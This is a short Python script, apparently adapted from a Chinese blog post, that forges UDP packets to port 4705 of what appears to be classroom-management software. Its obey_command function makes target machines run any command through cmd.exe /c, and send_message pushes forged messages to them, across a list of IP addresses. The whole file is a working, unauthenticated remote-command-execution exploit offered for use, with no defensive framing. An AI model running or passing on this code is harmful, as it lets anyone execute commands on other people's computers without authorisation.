#参考原文链接：https://blog.csdn.net/mxymmxym/article/details/126343324

import binascii
import socket

def obey_command(ips,command):
    #C:\Windows\System32
    
    ml="C:\\WINDOWS\\system32\\cmd.exe"
    cs="/c "
    
    
    cs+=command#mlcombobox.get()
    #print(ml)
    #print (cs)
    '''
    if ml=="":
        result=showinfo("错误","没有命令")
        return
    
    try:
        iplist.get(iplist.curselection())
    except:
        result=showinfo("错误","没有指定ip")
        return
    '''
    payload= b"\x44\x4d\x4f\x43\x00\x00\x01\x00\x6e\x03\x00\x00\x53\xca\x6c\x1a\xee\x10\x8e\x41\x9f\x49\x72\xf3\x6d\x10\x9c\x69\x20\x4e\x00\x00\xc0\xa8\x03\xfe\x61\x03\x00\x00\x61\x03\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x0f\x00\x00\x00\x01\x00\x00\x00"
    aaa=""
    bbb=""
    
    for i in ml:
        aaa += hex(ord(i))[2:]+"00"
    for i in cs:
        bbb += hex(ord(i))[2:]+"00"
    send=binascii.unhexlify(aaa)
    cs=binascii.unhexlify(bbb)
        
    payload+=send
    payload+=b"\x00"*(512-len(send))
    payload+=cs
    payload+=b"\x00"*(324-len(cs))
    payload+=b"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    #ip=iplist.get(iplist.curselection())

    #
    for ip in ips:
        sendto(payload,ip)
    #

def send_message(ips,message=""):
    #print(message)
    '''
    try:
        iplist.get(iplist.curselection())
    except:
        result=showinfo("错误","没有指定ip")
        return
    '''
    payload=b"\x44\x4d\x4f\x43\x00\x00\x01\x00\x9e\x03\x00\x00\x7c\x73\x6b\xf7\x79\x0c\xdd\x46\x9d\x87\x4b\x4d\x79\xbc\x2b\x8d\x20\x4e\x00\x00\xc0\xa8\xab\x83\x91\x03\x00\x00\x91\x03\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00"
    #ip=iplist.get(iplist.curselection())
    #message=""
    #message=msgentry.get()
    aaa=""
    for i in message:
        if (i>="a" and i<="z")or(i>="A" and i<="Z"):
            aaa+="00"
        aaa+=hex(ord(i))[2:]
    js=0
    aaa=list(aaa)
    for i in aaa:
        if(js%4==0):
            aaa[js],aaa[js+2]=aaa[js+2],aaa[js]
            aaa[js+1],aaa[js+3]=aaa[js+3],aaa[js+1]
        js+=1
    aaa=''.join(aaa)
    send=binascii.unhexlify(aaa)
    payload+=send
    payload+=b"\x00"*(898-len(send))

    #
    for ip in ips:
        sendto(payload,ip)
    #

def sendto(payload,ip):

    port=4705
    s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    s.sendto(payload,(ip,port))
